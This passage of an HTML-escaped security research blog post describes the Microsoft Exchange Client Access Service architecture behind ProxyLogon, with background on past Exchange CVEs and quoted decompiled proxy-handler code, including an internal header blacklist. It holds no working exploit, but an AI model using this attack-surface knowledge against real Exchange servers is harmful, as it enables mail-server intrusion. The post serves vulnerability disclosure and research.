      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;Why did Exchange Server become a hot topic? From my point of view, the whole ProxyLogon attack surface is actually located at an early stage of Exchange request processing. For instance, if the entrance of Exchange is 0, and 100 is the core business logic, ProxyLogon is somewhere around 10. Again, since the vulnerability is located at the beginning place, I believe anyone who has reviewed the security of Exchange carefully would spot the attack surface. This was also &lt;a href=&quot;https://twitter.com/orange_8361/status/1346401788811825153&quot;&gt;why I tweeted my worry&lt;/a&gt; about bug collision after reporting to Microsoft. The vulnerability was so impactful, yet it’s a simple one and located at such an early stage.&lt;/p&gt;

&lt;p&gt;You all know what happened next, Volexity found that an APT group was leveraging the same SSRF (&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;) to access users’ emails in early January 2021 and reported to Microsoft. Microsoft also released the urgent patches in March. From the &lt;a href=&quot;https://youtu.be/rB255D-wnw0?t=999&quot;&gt;public information&lt;/a&gt; released afterwards, we found that even though they used the same SSRF, the APT group was exploiting it in a very different way from us. We completed the ProxyLogon attack chain through &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;, while the APT group used EWS and two unknown vulnerabilities in their attack. This has convinced us that there is a bug collision on the SSRF vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/1.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;&lt;small&gt;Image from &lt;a href=&quot;https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/&quot;&gt;Microsoft Blog&lt;/a&gt;&lt;/small&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Regarding the ProxyLogon PoC we reported to MSRC appeared in the wild in late February, we were as curious as everyone after eliminating the possibility of leakage from our side through a thorough investigation. With a clearer timeline appearing and more discussion occurring, it seems like this is &lt;a href=&quot;https://msrc-blog.microsoft.com/2012/03/16/proof-of-concept-code-available-for-ms12-020/&quot;&gt;not the first time that something like this happened to Microsoft&lt;/a&gt;. Maybe you would be interested in learning some &lt;a href=&quot;https://www.wsj.com/articles/microsoft-probing-whether-leak-played-role-in-suspected-chinese-hack-11615575793&quot;&gt;interesting stories from here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;why-targeting-on-exchange-server&quot;&gt;Why targeting on Exchange Server?&lt;/h1&gt;

&lt;p&gt;Mail server is a highly valuable asset that holds the most confidential secrets and corporate data. In other words, controlling a mail server means controlling the lifeline of a company. As the most common-use email solution, Exchange Server has been the top target for hackers for a long time. Based on our research, there are more than four hundred thousands Exchange Servers exposed on the Internet. Each server represents a company, and you can imagine how horrible it is while a severe vulnerability appeared in Exchange Server.&lt;/p&gt;

&lt;p&gt;Normally, I will review the existing papers and bugs before starting a research. Among the whole Exchange history, is there any interesting case? Of course. Although most vulnerabilities are based on known attack vectors, such as the deserialization or bad input validation, there are still several bugs that are worth mentioning.&lt;/p&gt;

&lt;h3 id=&quot;the-most-special&quot;&gt;The most special&lt;/h3&gt;
&lt;p&gt;The most special one is the &lt;a href=&quot;https://msrc-blog.microsoft.com/2017/07/20/englishmansdentist-exploit-analysis/&quot;&gt;arsenal&lt;/a&gt; from &lt;a href=&quot;https://en.wikipedia.org/wiki/Equation_Group&quot;&gt;Equation Group&lt;/a&gt; in 2017. It’s the only practical and public pre-auth RCE in the Exchange history. Unfortunately, the arsenal only works on an ancient Exchange Server 2003. If the arsenal leak happened earlier, it could end up with another nuclear-level crisis.&lt;/p&gt;

&lt;h3 id=&quot;the-most-interesting&quot;&gt;The most interesting&lt;/h3&gt;
&lt;p&gt;The most interesting one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange&quot;&gt;CVE-2018-8581&lt;/a&gt; disclosed by someone who cooperated with ZDI. Though it was simply an SSRF, with the feature, it could be combined with NTLM Relay, the attacker could turn a boring SSRF into &lt;a href=&quot;https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&quot;&gt;something really fancy&lt;/a&gt;. For instance, it could directly control the whole Domain Controller through a low privilege account.&lt;/p&gt;

&lt;h3 id=&quot;the-most-surprising&quot;&gt;The most surprising&lt;/h3&gt;
&lt;p&gt;The most surprising one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688&lt;/a&gt;, which was also disclosed by someone working with ZDI. The root cause of this bug is due to a hard-coded cryptographic key in Microsoft Exchange. With this hard-coded key, an attacker with low privilege can take over the whole Exchange Server. And as you can see, even in 2020, a silly, hard-coded cryptographic key could still be found in an essential software like Exchange. This indicated that Exchange is lacking security reviews, which also inspired me to dig more into the Exchange security.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/2.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;where-is-the-new-attack-surface&quot;&gt;Where is the new attack surface&lt;/h1&gt;

&lt;p&gt;Exchange is a very sophisticated application. Since 2000, Exchange has released a new version every 3 years. Whenever Exchange releases a new version, the architecture changes a lot and becomes different. The changes of architecture and iterations make it difficult to upgrade an Exchange Server. In order to ensure the compatibility between the new architecture and old ones, several design debts were incurred to Exchange Server and led to the new attack surface we found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Where did we focus at Microsoft Exchange? We focused on the Client Access Service, CAS. CAS is a fundamental component of Exchange. Back to the version 2000/2003, CAS was an independent Frontend Server in charge of all the Frontend web rendering logics. After several renaming, integrating, and version differences, CAS has been downgraded to a service under the Mailbox Role. The &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/architecture/architecture?view=exchserver-2019&quot;&gt;official documentation from Microsoft&lt;/a&gt; indicates that:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Mailbox servers contain the Client Access services that &lt;strong&gt;accept client connections for all protocols&lt;/strong&gt;. These frontend services are &lt;strong&gt;responsible for routing or proxying connections&lt;/strong&gt; to the corresponding backend services on a Mailbox server&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From the narrative you could realize the importance of CAS, and you could imagine how critical it is when bugs are found in such infrastructure. CAS was where we focused on, and where the attack surface appeared.&lt;/p&gt;

&lt;h1 id=&quot;the-cas-architecture&quot;&gt;The CAS architecture&lt;/h1&gt;

&lt;p&gt;CAS is the fundamental component in charge of accepting all the connections from the client side, no matter if it’s HTTP, POP3, IMAP or SMTP, and proxies the connections to the corresponding Backend Service. As a Web Security researcher, I focused on the Web implementation of CAS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The CAS web is built on Microsoft IIS. As you can see, there are two websites inside the IIS. The “Default Website” is the Frontend we mentioned before, and the “Exchange Backend” is where the business logic is. After looking into the configuration carefully, we notice that the Frontend is binding with ports 80 and 443, and the Backend is listening on ports 81 and 444. All the ports are binding with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;, which means anyone could access the Frontend and Backend of Exchange directly. Wouldn’t it be dangerous? Please keep this question in mind and we will answer that later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exchange implements the logic of Frontend and Backend via IIS module. There are several modules in Frontend and Backend to complete different tasks, such as the filter, validation, and logging. The Frontend must contain a Proxy Module. The Proxy Module picks up the HTTP request from the client side and adds some internal settings, then forwards the request to the Backend. As for the Backend, all the applications include the Rehydration Module, which is in charge of parsing Frontend requests, populating the client information back, and continuing to process the business logic. Later we will be elaborating how Proxy Module and Rehydration Module work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;frontend-proxy-module&quot;&gt;Frontend Proxy Module&lt;/h2&gt;

&lt;p&gt;Proxy Module chooses a handler based on the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ApplicationPath&lt;/code&gt; to process the HTTP request from the client side. For instance, visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt; will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EwsProxyRequestHandler&lt;/code&gt;, as for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/OWA&lt;/code&gt; will trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OwaProxyRequestHandler&lt;/code&gt;. All the handlers in Exchange inherit the class from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; and implement its core logic, such as how to deal with the HTTP request from the user, which URL from Backend to proxy to, and how to synchronize the information with the Backend. The class is also the most centric part of the whole Proxy Module, we will separate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; into 3 sections:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-reqeust-section&quot;&gt;Frontend Reqeust Section&lt;/h3&gt;

&lt;p&gt;The Request section will parse the HTTP request from the client and determine which cookie and header could be proxied to the Backend. Frontend and Backend relied on HTTP Headers to synchronize information and proxy internal status. Therefore, Exchange has defined a blacklist to avoid some internal Headers being misused.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShouldCopyHeaderToServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-IsFromCafe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-SourceCafeServer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;msExchProxyUri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-MSExchangeActivityCtx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;return-client-request-id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;StartsWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Backend-Diag-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHttpRequestBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsProbeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the last stage of Request, Proxy Module will call the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddProtocolSpecificHeadersToServerRequest&lt;/code&gt; implemented by the handler to add the information to be communicated with the Backend in the HTTP header. This section will also serialize the information from the current login user and put it in a new HTTP header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which will be forwarded to the Backend later.&lt;/p&gt;

&lt;p&gt;For instance, If I log into Outlook Web Access (OWA) with the name Orange, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; that Frontend proxy to Backend will be:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-proxy-section&quot;&gt;Frontend Proxy Section&lt;/h3&gt;

&lt;p&gt;The Proxy Section first uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackendServerURL&lt;/code&gt; method to calculate which Backend URL should the HTTP request be forwarded to. Then initialize a new HTTP Client request with the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateServerRequest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CreateServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseDefaultWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NullWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionLimit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePointConnectionLimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-FE-ClientIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientProxyChainIPs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-Port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-MS-EdgeIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Utilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetEdgeServerIpAsProxyHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span 